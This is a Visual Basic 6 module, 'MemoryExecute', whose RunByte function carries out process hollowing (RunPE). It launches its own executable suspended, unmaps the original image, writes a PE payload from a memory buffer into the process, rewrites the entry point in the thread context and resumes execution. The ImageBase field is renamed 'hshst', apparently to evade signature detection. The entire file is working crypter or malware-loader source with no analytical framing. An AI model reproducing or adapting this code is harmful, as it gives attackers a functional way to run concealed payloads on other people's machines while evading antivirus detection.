Attribute VB_Name = "MemoryExecute"
Option Explicit
Public Const CONTEXT_X86 = &H10000
Public Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)
Public Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)
Public Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)
Public Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)
Public Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10)
Public Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)
Public Const IMAGE_DOS_SIGNATURE = &H5A4D    '//MZ
Public Const IMAGE_OS2_SIGNATURE = &H454E    '//NE
Public Const IMAGE_OS2_SIGNATURE_LE = &H454C '//LE
Public Const IMAGE_VXD_SIGNATURE = &H454C    '//LE
Public Const IMAGE_NT_SIGNATURE = &H4550     '//PE00
Public Const SIZE_OF_80387_REGISTERS = 80
Public Const CREATE_SUSPENDED = &H4
Public Const MEM_COMMIT = &H1000
Public Const MEM_RESERVE = &H2000
Public Const PAGE_READONLY = &H2
Public Const PAGE_READWRITE = &H4
Public Const PAGE_EXECUTE = &H10
Public Const PAGE_EXECUTE_READ = &H20
Public Const PAGE_EXECUTE_READWRITE = &H40
Public Const PAGE_NOACCESS = &H1
Public Const PAGE_NOCACHE = &H200
Public Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(1 To SIZE_OF_80387_REGISTERS) As Byte
    Cr0NpxState As Long
End Type
Public Type CONTEXT86
    ContextFlags As Long
    'CONTEXT_DEBUG_REGISTERS
    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long
    'CONTEXT_FLOATING_POINT
    FloatSave As FLOATING_SAVE_AREA
    'CONTEXT_SEGMENTS
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    'CONTEXT_INTEGER
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    'CONTEXT_CONTROL
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type
Public Type IMAGE_DOS_HEADER
    e_magic As Integer        ' Magic number
    e_cblp As Integer         ' Bytes on last page of file
    e_cp As Integer           ' Pages in file
    e_crlc As Integer         ' Relocations
    e_cparhdr As Integer      ' Size of header in paragraphs
    e_minalloc As Integer     ' Minimum extra paragraphs needed
    e_maxalloc As Integer     ' Maximum extra paragraphs needed
    e_ss As Integer           ' Initial (relative) SS value
    e_sp As Integer           ' Initial SP value
    e_csum As Integer         ' Checksum
    e_ip As Integer           ' Initial IP value
    e_cs As Integer           ' Initial (relative) CS value
    e_lfarlc As Integer       ' File address of relocation table
    e_ovno As Integer         ' Overlay number
    e_res(0 To 3) As Integer  ' Reserved words
    e_oemid As Integer        ' OEM identifier (for e_oeminfo)
    e_oeminfo As Integer      ' OEM information; e_oemid specific
    e_res2(0 To 9) As Integer ' Reserved words
    e_lfanew As Long          ' File address of new exe header
End Type

Public Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    Characteristics As Integer
End Type

Public Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16

Public Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Public Type IMAGE_OPTIONAL_HEADER
    ' Standard fields.
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUninitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    hshst As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    Win32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    Subsystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Public Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Public Const IMAGE_SIZEOF_SHORT_NAME = 8

Public Type IMAGE_SECTION_HEADER
    NameOfSection(IMAGE_SIZEOF_SHORT_NAME - 1) As Byte
    VirtualSize As Long
    VirtualAddress As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLineNumbers As Long
    NumberOfRelocations As Integer
    NumberOfLineNumbers As Integer
    Characteristics As Long
End Type
Public Type PROCESS_INFORMATION
   hProcess As Long
   hThread As Long
   dwProcessId As Long
   dwThreadId As Long
End Type

Public Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (lpDest As Any, lpSource As Any, ByVal cBytes As Long)
Public Const OFFSET_4 = 4294967296#

Public Function RunByte(Buffer() As Byte) As Long
Dim IDH As IMAGE_DOS_HEADER
Dim INH As IMAGE_NT_HEADERS
Dim ISH As IMAGE_SECTION_HEADER
Dim PI As PROCESS_INFORMATION
Dim SI As STARTUPINFO
Dim CONTEXT As CONTEXT86
Dim i As Long
Dim Addr As Long
Dim hshst As Long
Dim WroteStuuffs As Long
Dim Offset As Long
    Call CopyMemory(IDH, Buffer(0), Len(IDH))
    If IDH.e_magic <> IMAGE_DOS_SIGNATURE Then
        Exit Function
        End If
    Call CopyMemory(INH, Buffer(IDH.e_lfanew), Len(INH))
    If INH.Signature <> IMAGE_NT_SIGNATURE Then
        Exit Function
    End If
    SI.cb = Len(SI)
    If CreateProcess(vbNullString, App.Path & "\" & App.EXEName & ".exe", 0, 0, False, CREATE_SUSPENDED, 0, 0, SI, PI) = 0 Then
        Exit Function
    End If
    CONTEXT.ContextFlags = CONTEXT86_INTEGER
    If GetThreadContext(PI.hThread, CONTEXT) = 0 Then GoTo ClearProcess
    Call ReadProcessMemory(PI.hProcess, ByVal CONTEXT.Ebx + 8, Addr, 4, 0)
    If Addr = 0 Then GoTo ClearProcess
    If CallAPIByName("ntdll.dll", "ZwUnmapViewOfSection", PI.hProcess, Addr) Then GoTo ClearProcess
    hshst = CallAPIByName("kernel32.dll", "VirtualAllocEx", PI.hProcess, INH.OptionalHeader.hshst, INH.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
    If hshst = 0 Then GoTo ClearProcess
    Call WriteProcessMemory(PI.hProcess, ByVal hshst, Buffer(0), INH.OptionalHeader.SizeOfHeaders, WroteStuuffs)
    Offset = IDH.e_lfanew + Len(INH)
    For i = 0 To INH.FileHeader.NumberOfSections - 1
        Call CopyMemory(ISH, Buffer(Offset + i * Len(ISH)), Len(ISH))
        Call WriteProcessMemory(PI.hProcess, ByVal hshst + ISH.VirtualAddress, Buffer(ISH.PointerToRawData), ISH.SizeOfRawData, WroteStuuffs)
        Call CallAPIByName("kernel32.dll", "VirtualProtectEx", PI.hProcess, hshst + ISH.VirtualAddress, ISH.VirtualSize, Protect(ISH.Characteristics), Addr)
    Next i
    Call WriteProcessMemory(PI.hProcess, ByVal CONTEXT.Ebx + 8, hshst, 4, WroteStuuffs)
    CONTEXT.Eax = hshst + INH.OptionalHeader.AddressOfEntryPoint
    Call SetThreadContext(PI.hThread, CONTEXT)
    Call CallAPIByName("kernel32.dll", "ResumeThread", PI.hThread)
    Exit Function
ClearProcess:
    Call CallAPIByName("kernel32.dll", "CloseHandle", PI.hThread)
    Call CallAPIByName("kernel32.dll", "CloseHandle", PI.hProcess)
End Function

Public Function Protect(ByVal Characteristics As Long) As Long
Dim Mapping As Variant
    Mapping = Array(PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE)
    Protect = Mapping(RShift(Characteristics, 29))
End Function

Public Function RShift(ByVal Value As Long, ByVal NumberOfBitsToShift As Long) As Long
    RShift = vbLongToULong(Value) / (2 ^ NumberOfBitsToShift)
End Function

Public Function vbLongToULong(ByVal Value As Long) As Double
    If Value < 0 Then
        vbLongToULong = Value + OFFSET_4
    Else
        vbLongToULong = Value
    End If
End Function


